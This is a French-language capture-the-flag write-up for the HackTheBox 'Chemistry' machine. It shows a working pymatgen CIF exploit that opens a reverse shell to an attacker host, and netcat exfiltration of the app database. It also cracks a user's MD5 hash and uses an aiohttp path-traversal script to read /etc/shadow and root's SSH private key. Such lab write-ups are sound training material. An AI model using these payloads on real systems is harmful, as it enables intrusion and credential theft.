---
title: Chemistry
tags: [HackTheBox, Facile, Linux, Python, Flask, CVE]
style: border
color: htb
comments: false
description: Douzième semaine de la saison 6 "HEIST"
created: 26/10/2024
modified: 18/03/2025
---

## Sommaire <!-- omit in toc -->

* [Reconnaissance](#reconnaissance)
* [Exploitation du serveur Flask](#exploitation-du-serveur-flask)
* [Escalade horizontale](#escalade-horizontale)
* [Élévation de privilèges](#élévation-de-privilèges)
  * [Récupérer le flag](#récupérer-le-flag)
  * [Obtenir l'accès root](#obtenir-laccès-root)

## Reconnaissance

```bash
nmap -A -T4 chemistry.htb
```

{% capture spoil %}
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 11:14 CEST
Warning: 10.10.11.38 giving up on port because retransmission cap hit (6).
Nmap scan report for chemistry.htb (10.10.11.38)
Host is up (0.024s latency).
Not shown: 974 closed tcp ports (reset)
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
[...expurgé pour brièveté...]
5000/tcp  open     upnp?
[...expurgé pour brièveté...]
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=10/26%Time=671CB332%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,38A,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3
[...expurgé pour brièveté...]
SF:equest\x20syntax\x20or\x20unsupported\x20method\.</p>\n\x20\x20\x20\x20
SF:</body>\n</html>\n");
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   29.67 ms 10.10.14.1
2   29.83 ms chemistry.htb (10.10.11.38)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 162.53 seconds
{% endcapture %}
{% include elements/spoil.html %}

L'analyse du serveur avec {% include dictionary.html word="NMAP" %} nous indique la présence d'un service {% include dictionary.html word="SSH" %} sur le port 22, et d'un serveur Web Python sur le port 5000 avec *Werkzeug*, un outil de debugging pour Flask.

## Exploitation du serveur Flask

En recherchant des exploitations sur l'outil Werkzeug, le site [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) nous invite à tenter d'accéder à la console de debug à l'adresse `chemistry.htb:5000/console`. Malheureusement nous recevons une erreur **Not Found**.

Nous nous intéressons donc au contenu du site hébergé sur le port 5000

{% include elements/figure_spoil.html image="/images/HTB/20241026/Capture_ecran_2024-10-26_website.png" caption="Accueil du site" %}

Nous sommes inviter à créer notre propre compte, puis nous avons accès à une interface permettant d'uploader des fichiers CIF :

{% include elements/figure_spoil.html image="/images/HTB/20241026/Capture_ecran_2024-10-26_account.png" caption="Une fois connecté, nous pouvons uploader des fichiers" %}

Nous récupérons le fichier d'exemple en cliquant sur `here` et nous tentons de le téléverser sur notre compte.

```bash
cat example.cif                  
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

Le fichier apparaît désormais dans notre tableau de bord, et nous pouvons l'ouvrir.

{% include elements/figure_spoil.html image="/images/HTB/20241026/Capture_ecran_2024-10-26_cif.png" caption="Le fichier d'entrée est traduit avant affichage" %}

En recherchant les outils Python permettant ce genre d'analyse, nous trouvons l'outil [pymatgen](https://pymatgen.org/pymatgen.core.html) qui semble connaître une vulnérabilité critique permettant l'exécution de code à distance. Le PoC est disponible sur [Github](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f).

Nous créons un fichier `.cif` qui devrait nous permettre d'obtenir un *{% include dictionary.html word="reverse-shell" %}* en modifiant la commande `touch pwned` de la *proof of concept* par `/bin/bash -c 'sh -i >& /dev/tcp/10.10.14.37/9000 0>&1'`, ce qui donne :

```cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c 'sh -i >& /dev/tcp/10.10.14.37/9000 0>&1'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Grâce à l'outil {% include dictionary.html word="Netcat" %} en écoute sur le bon port, nous obtenons un *{% include dictionary.html word="reverse-shell" %}*

```bash
nc -lvnp 9000            
listening on [any] 9000 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.11.38] 46908
sh: 0: can't access tty; job control turned off
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```

Nous pouvons améliorer l'interactivité du shell obtenu :

{% gist ab3c791e25baa7b437d0324f6d3195af %}

## Escalade horizontale

L'utilisateur `app` ne semble pas avoir beaucoup de privilèges sur la machine. En revanche, nous notons l'existence d'une autre utilisatrice `rosa` qui pourrait avoir des droits {% include dictionary.html word="sudo" %}.

```bash
pwd
/home/app

ls -hAl /home
total 8.0K
drwxr-xr-x 8 app  app  4.0K Oct 26 09:48 app
drwxr-xr-x 5 rosa rosa 4.0K Oct 26 10:05 rosa

cd /home/rosa

ls -hAl
total 28K
lrwxrwxrwx 1 root root    9 Jun 17 01:50 .bash_history -> /dev/null
-rw-r--r-- 1 rosa rosa  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 rosa rosa 3.7K Feb 25  2020 .bashrc
drwx------ 2 rosa rosa 4.0K Jun 15 20:38 .cache
drwxrwxr-x 4 rosa rosa 4.0K Jun 16 16:04 .local
-rw-r--r-- 1 rosa rosa  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root root    9 Jun 17 01:51 .sqlite_history -> /dev/null
drwx------ 2 rosa rosa 4.0K Jun 15 18:24 .ssh
-rw-r--r-- 1 rosa rosa    0 Jun 15 20:43 .sudo_as_admin_successful
-rw-r----- 1 root rosa   33 Oct 26 09:39 user.txt
```

Dans le répertoire de l'utilisateur `app` nous repérons une base de données et nous tentons de l'exfiltrer pour l'analyser

```bash
ls -hAl
total 44K
-rw------- 1 app  app  5.8K Oct  9 20:08 app.py
lrwxrwxrwx 1 root root    9 Jun 17 01:51 .bash_history -> /dev/null
-rw-r--r-- 1 app  app   220 Jun 15 20:43 .bash_logout
-rw-r--r-- 1 app  app  3.7K Jun 15 20:43 .bashrc
drwxrwxr-x 3 app  app  4.0K Jun 17 00:44 .cache
drwx------ 2 app  app  4.0K Oct 26 10:12 instance
drwx------ 7 app  app  4.0K Jun 15 22:57 .local
-rw-r--r-- 1 app  app   807 Jun 15 20:43 .profile
-rw-r--r-- 1 app  app     0 Oct 26 09:48 pwned
lrwxrwxrwx 1 root root    9 Jun 17 01:52 .sqlite_history -> /dev/null
drwx------ 2 app  app  4.0K Oct  9 20:13 static
drwx------ 2 app  app  4.0K Oct  9 20:18 templates
drwx------ 2 app  app  4.0K Oct 26 10:12 uploads

cd instance

ls
database.db

nc -w 3 10.10.14.37 9001 < database.db
```

En écoutant avec {% include dictionary.html word="Netcat" %} sur notre machine, nous récupérons la base de données

```bash
nc -lvnp 9001 > database.db 
listening on [any] 9001 ...
connect to [10.10.14.37] from (UNKNOWN) [10.10.11.38] 58882

ls -hl                     
total 28K
-rw-rw-r-- 1 tiflo tiflo 20K 26 oct.  12:18 database.db
```

Nous pouvons ouvrir et naviguer dans la base de données grâce à l'outil `sqlite3` :

```bash
sqlite3 database.db
```

```txt
.tables
structure  user
select * from user;
1|admin|2861[...expurgé...]52abf
2|app|1978[...expurgé...]9886a
3|rosa|63ed[...expurgé...]251a5
4|robert|02fc[...expurgé...]6b467
[...expurgé pour brièveté...]
15|tiflo|903ef2[...expurgé...]532aef
[...expurgé pour brièveté...]
```

Nous y retrouvons même nos identifiants utilisés pour interagir avec l'application. Mais plus important : nous trouvons des identifiants pour `rosa`.

Nous commençons par utiliser `hash-identifier` pour déterminer le chiffrement du mot de passe :

```bash
hash-identifier
HASH: 63ed[...expurgé...]251a5

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```

Puis nous utiliserons {% include dictionary.html word="Hashcat" %} pour tenter de forcer le mot de passe.

```bash
hashcat -m 0 '63ed[...expurgé...]251a5' /usr/share/wordlists/rockyou.txt
```

{% capture spoil %}
hashcat (v6.2.6) starting

[...expurgé pour brièveté...]

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

63ed[...expurgé...]251a5:uni[...expurgé...]dos        
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 63ed[...expurgé...]251a5
Time.Started.....: Sat Oct 26 12:33:52 2024 (2 secs)
Time.Estimated...: Sat Oct 26 12:33:54 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1226.2 kH/s (0.19ms) @ Accel:512 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2983936/14344385 (20.80%)
Rejected.........: 0/2983936 (0.00%)
Restore.Point....: 2981888/14344385 (20.79%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: unicornn -> underwear88
Hardware.Mon.#1..: Util: 32%

Started: Sat Oct 26 12:33:29 2024
Stopped: Sat Oct 26 12:33:55 2024
{% endcapture %}
{% include elements/spoil.html %}

Le mot de passe trouvé dans la base de données correspond également au mot de passe permettant de se connecter en {% include dictionary.html word="SSH" %} sur le serveur.

```bash
ssh rosa@chemistry.htb
rosa@chemistry.htb's password:
rosa@chemistry:~$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
```

Nous pouvons désormais récupérer le flag utilisateur

```bash
cat user.txt
fbc857[...expurgé...]e60b05
```

## Élévation de privilèges

Contrairement à ce que nous pensions, `rosa` n'a pas de permission {% include dictionary.html word="sudo" %} sur la machine.

```bash
sudo -l
[sudo] password for rosa: 
Sorry, user rosa may not run sudo on chemistry.
```

Une rapide analyse des fichiers à droits élevés avec les commandes ci-dessous ne nous a pas permis de trouver de levier pour augmenter nos privilèges.

{% gist fb795c271652c9004ad77f11be2b66db %}

Le fichier `crontab` ne présente pas plus possibilité.

Nous téléchargeons l'outil [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) afin de lister les vulnérabilités de la machine, et nous observons un serveur sur le port 8080 écoutant l'adresse *localhost*

```txt
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      109250/bash         
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```

En tentant de nous connecter à ce serveur, nous obtenons la réponse suivante

```bash
curl -i localhost:8080
```

```html
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Sat, 26 Oct 2024 10:56:39 GMT
Server: Python/3.9 aiohttp/3.9.1

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Monitoring</title>
    <link rel="stylesheet" href="/assets/css/all.min.css">
    <script src="/assets/js/jquery-3.6.0.min.js"></script>
    <script src="/assets/js/chart.js"></script>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
    h2 {
      color: black;
      font-style: italic;
    }


    </style>
</head>
```

En recherchant des informations sur `aiohttp`, nous trouvons des vulnérabilités, notamment le [CVE-2024-23334](https://github.com/z3rObyte/CVE-2024-23334-PoC) qui permet de tester différentes façons d'accéder à des fichiers. Nous copions le contenu du fichier `exploit.sh` sur le serveur sous `/tmp/.test/test.sh` et nous le modifions pour qu'il se connecte au port 8080 et non 8081, et qu'il prenne le dossier `/assets/` comme point de départ (dossier trouver lors du `curl` au-dessus) et non `/static/` comme dans la PoC.

Ce qui donne :

```bash
#!/bin/bash

url="http://localhost:8080"
string="../"
payload="/assets/"
file="etc/passwd" # without the first /

for ((i=0; i<15; i++)); do
    payload+="$string"
    echo "[+] Testing with $payload$file"
    status_code=$(curl --path-as-is -s -o /dev/null -w "%{http_code}" "$url$payload$file")
    echo -e "\tStatus code --> $status_code"
    
    if [[ $status_code -eq 200 ]]; then
        curl -s --path-as-is "$url$payload$file"
        break
    fi
done
```

Le test est concluant, nous parvenons à récupérer le contenu du fichier cible :

```bash
bash test.sh 
[+] Testing with /assets/../etc/passwd
	Status code --> 404
[+] Testing with /assets/../../etc/passwd
	Status code --> 404
[+] Testing with /assets/../../../etc/passwd
	Status code --> 200
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
[...expurgé pour brièveté...]
```

Pour terminer ce défi, deux choix s'offre à nous : récupérer le flag root directement via cette exploitation, ou essayer d'obtenir des identifiants root sur la machine.

### Récupérer le flag

En remplaçant l'entrée `file="etc/passwd"` par `file="root/root.txt"` nous pouvons facilement obtenir le flag root :

```bash
bash test.sh 
[+] Testing with /assets/../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../root/root.txt
	Status code --> 404
[+] Testing with /assets/../../../root/root.txt
	Status code --> 200
284bf1[...expurgé...]b09ad9
```

### Obtenir l'accès root

Nous allons également tenter de trouver un accès au compte root, pour le challenge.

Nous avons commencer par récupérer le hash du mot de passe de root en ouvrant le fichier `/etc/shadow` mais le mot de passe semble assez solide pour ne pas tomber avec la liste **rockyou**

Nous avons ensuite cherché une clé {% include dictionary.html word="SSH" %} pour le compte root en modifiant l'entrée `file=root/.ssh/id_rsa`

```bash
bash test.sh 
[+] Testing with /assets/../root/.ssh/id_rsa
	Status code --> 404
[+] Testing with /assets/../../root/.ssh/id_rsa
	Status code --> 404
[+] Testing with /assets/../../../root/.ssh/id_rsa
	Status code --> 200
-----BEGIN OPENSSH PRIVATE KEY-----
[...expurgé...]
-----END OPENSSH PRIVATE KEY-----
```

Nous copions le contenu découvert sur notre machine, et nous lui attribuons les bons droits via la commande `chmod 600 id_rsa_root` puis nous pouvons nous connecter avec succès et récupérer le flag.

```bash
ssh -i id_rsa_root root@chemistry.htb

id
uid=0(root) gid=0(root) groups=0(root)

cat root.txt 
284bf1[...expurgé...]b09ad9
```
